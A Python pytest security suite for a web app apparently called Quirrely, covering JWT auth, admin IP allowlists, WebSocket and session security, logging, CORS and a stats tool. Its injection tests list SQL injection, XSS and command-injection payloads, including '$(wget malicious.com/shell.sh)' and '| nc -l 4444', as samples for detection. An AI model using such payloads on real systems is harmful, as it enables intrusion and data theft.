#!/usr/bin/env python3
"""
QUIRRELY COMPREHENSIVE SECURITY TEST SUITE v1.0
Tests all security features implemented in the enhanced security audit.

Test Categories:
1. Authentication & Authorization
2. Admin Access Controls  
3. WebSocket Security
4. Session Management
5. Input Validation & Injection Prevention
6. Rate Limiting
7. Security Logging
8. CORS Security
9. Secret Management
10. Monitoring & Alerting
11. qstats Integration Testing
"""

import pytest
import asyncio
import json
import time
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, AsyncMock
from typing import Dict, Any
import jwt
import hashlib
import secrets

from fastapi import FastAPI, Request
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect
import redis

# Import our security modules
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + '/..')

from secure_auth_middleware import (
    SecureAuthConfig, 
    create_access_token, 
    decode_token,
    validate_environment_secrets
)
from admin_security_middleware import (
    AdminSecurityMiddleware,
    is_ip_allowed,
    get_client_ip
)
from websocket_auth_middleware import (
    SecureConnectionManager,
    authenticate_websocket
)
from redis_session_store import RedisSessionStore
from security_logger import (
    SecurityLogger,
    SecurityEventType, 
    SecurityEventSeverity,
    security_logger
)


# ═══════════════════════════════════════════════════════════════════════════
# TEST FIXTURES
# ═══════════════════════════════════════════════════════════════════════════

@pytest.fixture
def mock_redis():
    """Mock Redis for testing."""
    with patch('redis.asyncio.Redis') as mock:
        mock_instance = AsyncMock()
        mock.return_value = mock_instance
        yield mock_instance

@pytest.fixture
def security_app():
    """Create test app with security middleware."""
    app = FastAPI()
    app.add_middleware(AdminSecurityMiddleware)
    
    @app.get("/api/admin/test")
    async def admin_endpoint():
        return {"message": "admin access granted"}
    
    @app.get("/api/public/test")
    async def public_endpoint():
        return {"message": "public access"}
    
    return app

@pytest.fixture
def auth_tokens():
    """Generate test JWT tokens."""
    # Set test JWT secret
    os.environ['JWT_SECRET'] = 'test-secret-' + secrets.token_hex(32)
    
    access_token = create_access_token(
        user_id="test-user-123",
        email="test@example.com", 
        tier="authority",
        addons=["admin"]
    )
    
    refresh_token = create_access_token(
        user_id="test-user-123",
        email="test@example.com",
        tier="free"
    )
    
    return {
        "access_token": access_token,
        "refresh_token": refresh_token,
        "admin_token": access_token,
        "user_token": refresh_token
    }

@pytest.fixture
def session_store(mock_redis):
    """Test session store."""
    store = RedisSessionStore()
    store.redis_client = mock_redis
    return store

# ═══════════════════════════════════════════════════════════════════════════
# AUTHENTICATION & AUTHORIZATION TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestAuthentication:
    """Test authentication mechanisms."""
    
    def test_jwt_secret_validation(self):
        """Test JWT secret strength validation."""
        # Test weak secrets are rejected
        with pytest.raises(ValueError):
            os.environ['JWT_SECRET'] = 'weak'
            SecureAuthConfig()
        
        # Test strong secret is accepted
        os.environ['JWT_SECRET'] = secrets.token_hex(64)
        config = SecureAuthConfig()
        assert len(config.JWT_SECRET) >= 64
    
    def test_access_token_creation_and_validation(self, auth_tokens):
        """Test access token creation and validation."""
        token = auth_tokens["access_token"]
        
        # Token should decode successfully
        payload = decode_token(token)
        assert payload is not None
        assert payload["sub"] == "test-user-123"
        assert payload["email"] == "test@example.com"
        assert payload["tier"] == "authority"
        assert "admin" in payload["addons"]
        
        # Token should have required security fields
        assert "jti" in payload  # JWT ID
        assert "iss" in payload  # Issuer
        assert "aud" in payload  # Audience
        assert "nbf" in payload  # Not before
    
    def test_token_expiration(self):
        """Test token expiration handling."""
        # Create expired token
        past_time = datetime.utcnow() - timedelta(hours=1)
        
        with patch('secure_auth_middleware.datetime') as mock_datetime:
            mock_datetime.utcnow.return_value = past_time
            expired_token = create_access_token(
                user_id="test-user",
                email="test@example.com",
                tier="free"
            )
        
        # Should not validate
        payload = decode_token(expired_token)
        assert payload is None
    
    def test_invalid_token_handling(self):
        """Test handling of invalid tokens."""
        # Invalid token should return None
        assert decode_token("invalid.token.here") is None
        assert decode_token("") is None
        assert decode_token(None) is None
    
    def test_environment_secret_validation(self):
        """Test environment secret validation."""
        # Set up valid environment
        os.environ['JWT_SECRET'] = secrets.token_hex(64)
        os.environ['SESSION_SECRET'] = secrets.token_hex(32)
        
        result = validate_environment_secrets()
        assert result['valid'] is True
        assert len(result['issues']) == 0


# ═══════════════════════════════════════════════════════════════════════════
# ADMIN ACCESS CONTROL TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestAdminAccessControl:
    """Test admin access control mechanisms."""
    
    def test_ip_whitelist_validation(self):
        """Test IP whitelist functionality."""
        # Test allowed IPs
        assert is_ip_allowed("127.0.0.1") is True
        assert is_ip_allowed("192.168.1.100") is True
        assert is_ip_allowed("10.0.0.5") is True
        
        # Test blocked IPs
        assert is_ip_allowed("1.2.3.4") is False
        assert is_ip_allowed("8.8.8.8") is False
        
        # Test invalid IPs
        assert is_ip_allowed("invalid-ip") is False
        assert is_ip_allowed("999.999.999.999") is False
    
    def test_admin_endpoint_protection(self, security_app):
        """Test admin endpoints require proper access."""
        client = TestClient(security_app)
        
        # Should block unauthorized IP
        with patch('admin_security_middleware.get_client_ip', return_value="1.2.3.4"):
            response = client.get("/api/admin/test")
            assert response.status_code == 403
        
        # Should allow authorized IP with proper headers
        with patch('admin_security_middleware.get_client_ip', return_value="127.0.0.1"):
            response = client.get(
                "/api/admin/test",
                headers={"X-Admin-IP-Verified": "true"}
            )
            # May still fail due to other middleware, but IP should pass
            # The specific response depends on full middleware stack
    
    def test_rate_limiting_admin_endpoints(self, security_app):
        """Test rate limiting on admin endpoints."""
        client = TestClient(security_app)
        
        # Test that rate limiting is enforced
        # This would need integration with actual rate limiting middleware
        # For now, test that the middleware is properly configured
        middleware_classes = [m.__class__.__name__ for m in security_app.user_middleware]
        assert "AdminSecurityMiddleware" in middleware_classes
    
    def test_admin_session_validation(self):
        """Test admin session validation."""
        # Test admin token validation
        admin_token = create_access_token(
            user_id="admin-123",
            email="admin@example.com",
            tier="authority",
            addons=["admin"]
        )
        
        payload = decode_token(admin_token)
        assert payload["tier"] == "authority"
        assert "admin" in payload["addons"]
        
        # Test non-admin token
        user_token = create_access_token(
            user_id="user-123", 
            email="user@example.com",
            tier="free"
        )
        
        payload = decode_token(user_token)
        assert payload["tier"] == "free"
        assert payload.get("addons", []) == []


# ═══════════════════════════════════════════════════════════════════════════
# WEBSOCKET SECURITY TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestWebSocketSecurity:
    """Test WebSocket security implementation."""
    
    @pytest.mark.asyncio
    async def test_websocket_authentication_required(self):
        """Test WebSocket connections require authentication."""
        manager = SecureConnectionManager()
        
        # Mock WebSocket
        mock_websocket = Mock()
        mock_websocket.headers = {}
        mock_websocket.client.host = "127.0.0.1"
        
        # Should fail without token
        with pytest.raises(Exception):
            await manager.authenticate_and_connect(mock_websocket, token=None)
    
    @pytest.mark.asyncio 
    async def test_websocket_admin_only_access(self, auth_tokens):
        """Test WebSocket admin-only access."""
        manager = SecureConnectionManager()
        
        # Mock WebSocket
        mock_websocket = Mock()
        mock_websocket.accept = AsyncMock()
        mock_websocket.headers = {}
        mock_websocket.client.host = "127.0.0.1"
        
        # Should allow admin token
        admin_token = auth_tokens["admin_token"]
        
        with patch.dict(os.environ, {"WS_REQUIRE_ADMIN": "true"}):
            auth_conn = await manager.authenticate_and_connect(
                mock_websocket, 
                token=admin_token
            )
            assert auth_conn.is_admin is True
    
    @pytest.mark.asyncio
    async def test_websocket_rate_limiting(self):
        """Test WebSocket rate limiting."""
        manager = SecureConnectionManager()
        
        # Mock connection
        mock_websocket = Mock()
        auth_conn = Mock()
        auth_conn.user_id = "test-user"
        auth_conn.message_count = 0
        auth_conn.last_activity = datetime.utcnow()
        
        manager.connections[mock_websocket] = auth_conn
        
        # First message should be allowed
        assert manager.update_activity(mock_websocket) is True
        
        # Simulate rapid messages
        auth_conn.message_count = 61  # Above rate limit
        auth_conn.last_activity = datetime.utcnow()
        
        assert manager.update_activity(mock_websocket) is False
    
    @pytest.mark.asyncio
    async def test_websocket_connection_limits(self):
        """Test WebSocket connection limits."""
        manager = SecureConnectionManager()
        
        # Test IP connection limits
        manager.connections_by_ip["127.0.0.1"] = set([Mock() for _ in range(3)])
        
        mock_websocket = Mock()
        mock_websocket.headers = {}
        mock_websocket.client.host = "127.0.0.1"
        
        # Should reject when IP limit exceeded
        with pytest.raises(Exception):
            await manager.authenticate_and_connect(mock_websocket, token="valid-token")


# ═══════════════════════════════════════════════════════════════════════════
# SESSION MANAGEMENT TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestSessionManagement:
    """Test Redis session management."""
    
    @pytest.mark.asyncio
    async def test_session_storage_and_retrieval(self, session_store):
        """Test session storage and retrieval."""
        session_id = "test-session-123"
        session_data = {
            "user_id": "user-123",
            "tier": "pro",
            "created_at": datetime.utcnow().isoformat()
        }
        
        # Mock Redis responses
        session_store.redis_client.setex.return_value = True
        session_store.redis_client.get.return_value = json.dumps(session_data).encode()
        
        # Store session
        result = await session_store.set_session(session_id, session_data)
        assert result is True
        
        # Retrieve session
        retrieved = await session_store.get_session(session_id)
        assert retrieved["user_id"] == "user-123"
        assert retrieved["tier"] == "pro"
    
    @pytest.mark.asyncio
    async def test_session_encryption(self, session_store):
        """Test session data encryption."""
        # Enable encryption
        session_store.config.ENCRYPT_SESSIONS = True
        session_store.encryption = Mock()
        session_store.encryption.encrypt_data.return_value = "encrypted-data"
        session_store.encryption.decrypt_data.return_value = '{"user_id": "user-123"}'
        
        session_data = {"user_id": "user-123", "tier": "pro"}
        
        # Mock Redis
        session_store.redis_client.setex.return_value = True
        session_store.redis_client.get.return_value = b"encrypted-data"
        
        # Store and retrieve
        await session_store.set_session("test-session", session_data)
        session_store.encryption.encrypt_data.assert_called_once()
        
        retrieved = await session_store.get_session("test-session") 
        session_store.encryption.decrypt_data.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_session_expiration(self, session_store):
        """Test session expiration handling."""
        session_store.redis_client.get.return_value = None  # Expired
        
        result = await session_store.get_session("expired-session")
        assert result is None
    
    @pytest.mark.asyncio 
    async def test_session_cleanup(self, session_store):
        """Test session cleanup functionality."""
        session_store.redis_client.keys.return_value = [
            b"quirrely:session:1", 
            b"quirrely:session:2"
        ]
        
        active_count = await session_store.cleanup_expired_sessions()
        assert active_count == 2


# ═══════════════════════════════════════════════════════════════════════════
# SECURITY LOGGING TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestSecurityLogging:
    """Test security logging and monitoring."""
    
    def test_security_event_creation(self):
        """Test security event creation and logging."""
        logger = SecurityLogger()
        
        # Mock the file handler to capture logs
        with patch.object(logger, '_write_event_sync') as mock_write:
            logger.log_event(
                SecurityEventType.AUTH_FAILURE,
                SecurityEventSeverity.HIGH,
                "Failed login attempt",
                user_id="test-user",
                ip_address="1.2.3.4"
            )
            
            mock_write.assert_called_once()
            event = mock_write.call_args[0][0]
            
            assert event.event_type == SecurityEventType.AUTH_FAILURE
            assert event.severity == SecurityEventSeverity.HIGH
            assert event.ip_address == "1.2.3.4"
            assert event.user_id == "test-user"
    
    def test_threat_detection_patterns(self):
        """Test threat detection in security logger."""
        logger = SecurityLogger()
        
        # Test SQL injection detection
        with patch.object(logger, '_write_event_sync'):
            logger.log_event(
                SecurityEventType.SQL_INJECTION_ATTEMPT,
                SecurityEventSeverity.CRITICAL,
                "SQL injection attempt detected",
                ip_address="1.2.3.4",
                additional_data={"payload": "'; DROP TABLE users; --"}
            )
        
        # Check threat engine detected the event
        threat_events = [
            e for e in logger.threat_engine.event_history
            if e.event_type == SecurityEventType.SQL_INJECTION_ATTEMPT
        ]
        assert len(threat_events) > 0
    
    def test_automated_ip_blocking(self):
        """Test automated IP blocking based on threat detection."""
        logger = SecurityLogger()
        test_ip = "1.2.3.4"
        
        # Simulate multiple failed auth attempts
        for i in range(6):  # Above threshold
            with patch.object(logger, '_write_event_sync'):
                logger.log_event(
                    SecurityEventType.AUTH_FAILURE,
                    SecurityEventSeverity.MEDIUM,
                    f"Failed login attempt {i}",
                    ip_address=test_ip
                )
        
        # Check if IP is marked for blocking
        analysis = logger.threat_engine.analyze_event(
            logger.threat_engine.event_history[-1]
        )
        assert analysis.get("threat_detected") is True
        assert analysis.get("threat_type") == "brute_force"
    
    def test_security_metrics_collection(self):
        """Test security metrics collection."""
        logger = SecurityLogger()
        
        # Add some test events
        with patch.object(logger, '_write_event_sync'):
            logger.log_event(
                SecurityEventType.AUTH_SUCCESS,
                SecurityEventSeverity.LOW,
                "User logged in",
                user_id="user-123"
            )
            
            logger.log_event(
                SecurityEventType.ADMIN_ACCESS,
                SecurityEventSeverity.HIGH,
                "Admin accessed system",
                user_id="admin-123"
            )
        
        stats = logger.get_security_stats()
        assert "total_events_24h" in stats
        assert "events_by_type" in stats
        assert "events_by_severity" in stats


# ═══════════════════════════════════════════════════════════════════════════
# INPUT VALIDATION & INJECTION PREVENTION TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestInputValidation:
    """Test input validation and injection prevention."""
    
    def test_sql_injection_prevention(self, security_app):
        """Test SQL injection attempt detection."""
        client = TestClient(security_app)
        
        # Test SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/*",
            "1; DELETE FROM users WHERE 1=1; --"
        ]
        
        # These should be detected and logged
        with patch.object(security_logger, 'log_event') as mock_log:
            for payload in sql_payloads:
                # Would normally test via actual endpoint that validates input
                # For now, test that the security logger would detect it
                security_logger.log_event(
                    SecurityEventType.SQL_INJECTION_ATTEMPT,
                    SecurityEventSeverity.CRITICAL,
                    f"SQL injection attempt: {payload}",
                    additional_data={"payload": payload}
                )
            
            assert mock_log.call_count >= len(sql_payloads)
    
    def test_xss_prevention(self):
        """Test XSS attempt detection."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>"
        ]
        
        with patch.object(security_logger, 'log_event') as mock_log:
            for payload in xss_payloads:
                security_logger.log_event(
                    SecurityEventType.XSS_ATTEMPT,
                    SecurityEventSeverity.HIGH,
                    f"XSS attempt: {payload}",
                    additional_data={"payload": payload}
                )
            
            assert mock_log.call_count >= len(xss_payloads)
    
    def test_command_injection_prevention(self):
        """Test command injection attempt detection."""
        command_payloads = [
            "; cat /etc/passwd",
            "| nc -l 4444",
            "$(wget malicious.com/shell.sh)",
            "`id`"
        ]
        
        # Command injection would be detected in security monitoring
        for payload in command_payloads:
            # Test that suspicious commands would be flagged
            assert any(pattern in payload for pattern in [';', '|', '$', '`'])


# ═══════════════════════════════════════════════════════════════════════════
# CORS SECURITY TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestCORSSecurity:
    """Test CORS security implementation."""
    
    def test_cors_origin_validation(self, security_app):
        """Test CORS origin validation."""
        client = TestClient(security_app)
        
        # Test allowed origins
        allowed_origins = [
            "https://quirrely.com",
            "https://www.quirrely.com",
            "https://api.quirrely.com"
        ]
        
        for origin in allowed_origins:
            response = client.options(
                "/api/public/test",
                headers={"Origin": origin}
            )
            # Should not be blocked for OPTIONS request
            assert response.status_code != 403
        
        # Test blocked origins (in production)
        blocked_origins = [
            "https://malicious.com",
            "http://localhost:3000",  # Blocked in production
            "null"  # Blocked in production
        ]
        
        # Would need to test with production CORS settings
        # For now, verify that CORS middleware is present
        middleware_classes = [m.__class__.__name__ for m in security_app.user_middleware]
        assert "CORSMiddleware" in str(security_app.user_middleware)
    
    def test_cors_headers_security(self, security_app):
        """Test CORS headers are properly restricted."""
        client = TestClient(security_app)
        
        response = client.options("/api/public/test")
        
        # Should have proper CORS headers
        headers = response.headers
        
        # Check that wildcard origins are not allowed in production
        # This would need to be tested with actual production config
        if "Access-Control-Allow-Origin" in headers:
            assert headers["Access-Control-Allow-Origin"] != "*"


# ═══════════════════════════════════════════════════════════════════════════
# MONITORING & ALERTING TESTS  
# ═══════════════════════════════════════════════════════════════════════════

class TestMonitoringAndAlerting:
    """Test monitoring and alerting functionality."""
    
    @pytest.mark.asyncio
    async def test_security_monitoring_detection(self):
        """Test security monitoring detection capabilities."""
        # This would test the security_monitoring.py module
        from security_monitoring import ThreatDetectionRules
        
        rules = ThreatDetectionRules()
        
        # Test SQL injection pattern detection
        sql_pattern = r'(?i)(union|select|drop|insert|delete).*(from|table)'
        test_input = "SELECT * FROM users WHERE 1=1; DROP TABLE users;"
        
        import re
        match = re.search(sql_pattern, test_input)
        assert match is not None
        
        # Test suspicious file pattern detection
        file_pattern = r'.*\.php\d*$'
        test_file = "backdoor.php"
        
        match = re.search(file_pattern, test_file)
        assert match is not None
    
    def test_alert_generation(self):
        """Test security alert generation."""
        logger = SecurityLogger()
        
        # Test alert generation for critical events
        with patch.object(logger, '_send_alert') as mock_alert:
            logger.log_event(
                SecurityEventType.SYSTEM_COMPROMISE,
                SecurityEventSeverity.CRITICAL,
                "System compromise detected",
                ip_address="1.2.3.4"
            )
            
            # Should generate alert for critical event
            mock_alert.assert_called()
    
    def test_compliance_reporting(self):
        """Test compliance reporting functionality."""
        # This would test compliance report generation
        from security_monitoring import ComplianceReporter
        
        reporter = ComplianceReporter()
        
        # Test that compliance methods exist
        assert hasattr(reporter, 'generate_daily_report')
        assert hasattr(reporter, '_get_compliance_status')


# ═══════════════════════════════════════════════════════════════════════════
# INTEGRATION TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestSecurityIntegration:
    """Integration tests for security components."""
    
    def test_full_security_pipeline(self, security_app, auth_tokens):
        """Test full security pipeline integration."""
        client = TestClient(security_app)
        
        # Test that security middleware stack works together
        middleware_names = [str(m) for m in security_app.user_middleware]
        
        # Should have security middleware
        assert any("AdminSecurity" in name for name in middleware_names)
        
        # Test authenticated request flow
        # (This would be more comprehensive with full app setup)
        
    def test_security_configuration_validation(self):
        """Test security configuration validation."""
        # Test that all required environment variables are validated
        required_vars = ['JWT_SECRET', 'SESSION_SECRET']
        
        for var in required_vars:
            if var in os.environ:
                # Should have strong values
                value = os.environ[var]
                assert len(value) >= 32
                assert value not in ['secret', 'password', 'admin', 'test']
    
    @pytest.mark.asyncio  
    async def test_end_to_end_security_flow(self, auth_tokens):
        """Test end-to-end security flow."""
        # Test complete security flow:
        # 1. Authentication
        # 2. Authorization  
        # 3. Session management
        # 4. Logging
        # 5. Monitoring
        
        # 1. Create and validate token
        token = auth_tokens["admin_token"]
        payload = decode_token(token)
        assert payload is not None
        
        # 2. Check admin authorization
        is_admin = payload.get("tier") == "authority" and "admin" in payload.get("addons", [])
        assert is_admin is True
        
        # 3. Session would be stored in Redis
        # (Tested in session management tests)
        
        # 4. Security event would be logged
        with patch.object(security_logger, 'log_event') as mock_log:
            security_logger.log_event(
                SecurityEventType.ADMIN_ACCESS,
                SecurityEventSeverity.HIGH,
                "Admin access granted",
                user_id=payload["sub"]
            )
            mock_log.assert_called_once()
        
        # 5. Monitoring would track the event
        # (Tested in monitoring tests)


# ═══════════════════════════════════════════════════════════════════════════
# QSTATS INTEGRATION TESTS
# ═══════════════════════════════════════════════════════════════════════════

class TestQStatsIntegration:
    """Test qstats command integration with security features."""
    
    def test_qstats_security_metrics_collection(self):
        """Test that qstats can collect security metrics."""
        from scripts.qstats import QuirrellyStat, SecurityMetrics
        
        qstats = QuirrellyStat()
        
        # Mock database connection
        with patch.object(qstats, 'db_conn') as mock_db:
            mock_cursor = Mock()
            mock_db.cursor.return_value = mock_cursor
            
            # Mock security events data
            mock_cursor.fetchone.side_effect = [
                (150, 5, 2, 12, 3),  # Security events query
                (None,),  # WebSocket connections
            ]
            mock_cursor.fetchall.return_value = [
                ('injection_attempt', 3),
                ('brute_force', 2),
            ]
            
            # Mock Redis connection
            qstats.redis_conn = Mock()
            qstats.redis_conn.keys.side_effect = [
                ['ws:conn1', 'ws:conn2'],  # WebSocket connections
                ['session:1', 'session:2', 'session:3'],  # Active sessions
            ]
            
            metrics = qstats.collect_security_metrics()
            
            assert isinstance(metrics, SecurityMetrics)
            assert metrics.total_events == 150
            assert metrics.threat_events == 5
            assert metrics.blocked_ips == 2
            assert metrics.failed_auths == 12
            assert metrics.admin_accesses == 3
            assert metrics.websocket_connections == 2
            assert metrics.active_sessions == 3
            assert metrics.security_score < 100  # Should be reduced due to threats
            assert 'injection_attempt' in metrics.threats_by_type
            assert 'brute_force' in metrics.threats_by_type

    def test_qstats_user_metrics_collection(self):
        """Test that qstats can collect user metrics."""
        from scripts.qstats import QuirrellyStat, UserMetrics
        
        qstats = QuirrellyStat()
        
        with patch.object(qstats, 'db_conn') as mock_db:
            mock_cursor = Mock()
            mock_db.cursor.return_value = mock_cursor
            
            # Mock user data
            mock_cursor.fetchone.side_effect = [
                (1250, 15, 45),  # User counts
                (120, 95, 25),   # Login statistics  
                (8,),            # Active countries
            ]
            mock_cursor.fetchall.return_value = [
                ('free', 800),
                ('pro', 350),
                ('authority', 100),
            ]
            
            metrics = qstats.collect_user_metrics()
            
            assert isinstance(metrics, UserMetrics)
            assert metrics.total_users == 1250
            assert metrics.new_signups_today == 15
            assert metrics.active_sessions == 45
            assert metrics.login_attempts_today == 120
            assert metrics.successful_logins_today == 95
            assert metrics.failed_logins_today == 25
            assert metrics.countries_active == 8
            assert 'free' in metrics.tier_distribution
            assert metrics.tier_distribution['free'] == 800

    def test_qstats_feature_metrics_collection(self):
        """Test that qstats can collect feature gate metrics."""
        from scripts.qstats import QuirrellyStat, FeatureMetrics
        
        qstats = QuirrellyStat()
        
        with patch.object(qstats, 'db_conn') as mock_db:
            mock_cursor = Mock()
            mock_db.cursor.return_value = mock_cursor
            
            # Mock feature access data
            mock_cursor.fetchone.side_effect = [
                (2500, 2200, 300, 45),  # Feature access checks
                (12,),                   # Tier upgrade requests
            ]
            mock_cursor.fetchall.return_value = [
                ('basic_analysis', 1200),
                ('save_results', 650),
                ('detailed_insights', 350),
            ]
            
            metrics = qstats.collect_feature_metrics()
            
            assert isinstance(metrics, FeatureMetrics)
            assert metrics.total_checks == 2500
            assert metrics.allowed_accesses == 2200
            assert metrics.denied_accesses == 300
            assert metrics.daily_limits_hit == 45
            assert metrics.tier_upgrade_requests == 12
            assert 'basic_analysis' in metrics.feature_usage
            assert metrics.feature_usage['basic_analysis'] == 1200

    def test_qstats_json_output(self):
        """Test that qstats can output JSON for automation."""
        from scripts.qstats import QuirrellyStat
        
        qstats = QuirrellyStat()
        
        # Mock all metric collection methods
        with patch.object(qstats, 'collect_security_metrics') as mock_security, \
             patch.object(qstats, 'collect_user_metrics') as mock_users, \
             patch.object(qstats, 'collect_feature_metrics') as mock_features, \
             patch.object(qstats, 'collect_system_metrics') as mock_system, \
             patch.object(qstats, 'collect_event_metrics') as mock_events, \
             patch('builtins.print') as mock_print:
            
            # Setup mock returns
            from scripts.qstats import SecurityMetrics, UserMetrics, FeatureMetrics, SystemMetrics, EventMetrics
            
            mock_security.return_value = SecurityMetrics(total_events=100, security_score=85.5)
            mock_users.return_value = UserMetrics(total_users=1000)
            mock_features.return_value = FeatureMetrics(total_checks=500)
            mock_system.return_value = SystemMetrics(database_connections=10)
            mock_events.return_value = EventMetrics(total_events=250)
            
            qstats.display_json(
                mock_security.return_value,
                mock_users.return_value, 
                mock_features.return_value,
                mock_system.return_value,
                mock_events.return_value
            )
            
            # Verify JSON was printed
            mock_print.assert_called_once()
            json_output = mock_print.call_args[0][0]
            
            # Verify JSON structure
            data = json.loads(json_output)
            assert 'timestamp' in data
            assert 'security' in data
            assert 'users' in data
            assert 'features' in data
            assert 'system' in data
            assert 'events' in data
            assert data['security']['total_events'] == 100
            assert data['security']['security_score'] == 85.5
            assert data['users']['total_users'] == 1000

    def test_qstats_command_line_interface(self):
        """Test qstats command line interface."""
        from scripts.qstats import QuirrellyStat
        
        qstats = QuirrellyStat()
        
        # Mock connection
        with patch.object(qstats, 'connect', return_value=True), \
             patch.object(qstats, 'collect_security_metrics'), \
             patch.object(qstats, 'collect_user_metrics'), \
             patch.object(qstats, 'collect_feature_metrics'), \
             patch.object(qstats, 'collect_system_metrics'), \
             patch.object(qstats, 'collect_event_metrics'), \
             patch.object(qstats, 'display_overview') as mock_overview:
            
            # Test default overview mode
            result = qstats.run([])
            assert result == 0
            mock_overview.assert_called_once()

    def test_qstats_security_score_calculation(self):
        """Test security score calculation logic."""
        from scripts.qstats import QuirrellyStat
        
        qstats = QuirrellyStat()
        
        with patch.object(qstats, 'db_conn') as mock_db:
            mock_cursor = Mock()
            mock_db.cursor.return_value = mock_cursor
            
            # Test high threat scenario
            mock_cursor.fetchone.side_effect = [
                (500, 25, 10, 100, 5),  # High threats, blocks, failed auths
            ]
            mock_cursor.fetchall.return_value = []
            
            qstats.redis_conn = Mock()
            qstats.redis_conn.keys.return_value = []
            
            metrics = qstats.collect_security_metrics()
            
            # Score should be significantly reduced
            assert metrics.security_score < 80
            
            # Reset and test low threat scenario
            mock_cursor.fetchone.side_effect = [
                (100, 2, 0, 5, 2),  # Low threats
            ]
            
            metrics = qstats.collect_security_metrics()
            
            # Score should be high
            assert metrics.security_score >= 90

    def test_qstats_database_error_handling(self):
        """Test qstats handles database errors gracefully."""
        from scripts.qstats import QuirrellyStat, SecurityMetrics
        
        qstats = QuirrellyStat()
        
        # Mock database connection that raises error
        with patch.object(qstats, 'db_conn') as mock_db:
            mock_db.cursor.side_effect = Exception("Database connection failed")
            
            # Should not crash, should return default metrics
            metrics = qstats.collect_security_metrics()
            
            assert isinstance(metrics, SecurityMetrics)
            assert metrics.total_events == 0
            assert metrics.security_score == 100.0

    def test_qstats_redis_integration(self):
        """Test qstats Redis integration for session and WebSocket data."""
        from scripts.qstats import QuirrellyStat
        
        qstats = QuirrellyStat()
        
        # Mock Redis connection
        mock_redis = Mock()
        qstats.redis_conn = mock_redis
        
        # Mock WebSocket and session keys
        mock_redis.keys.side_effect = [
            ['ws:user123', 'ws:user456'],  # WebSocket connections
            ['session:abc', 'session:def', 'session:ghi'],  # Active sessions
        ]
        
        # Mock database connection
        with patch.object(qstats, 'db_conn') as mock_db:
            mock_cursor = Mock()
            mock_db.cursor.return_value = mock_cursor
            mock_cursor.fetchone.return_value = (0, 0, 0, 0, 0)
            mock_cursor.fetchall.return_value = []
            
            metrics = qstats.collect_security_metrics()
            
            assert metrics.websocket_connections == 2
            assert metrics.active_sessions == 3
            
            # Verify Redis was called correctly
            expected_calls = [
                (('ws:*',),),
                (('session:*',),)
            ]
            assert mock_redis.keys.call_args_list == expected_calls


if __name__ == "__main__":
    pytest.main([__file__, "-v"])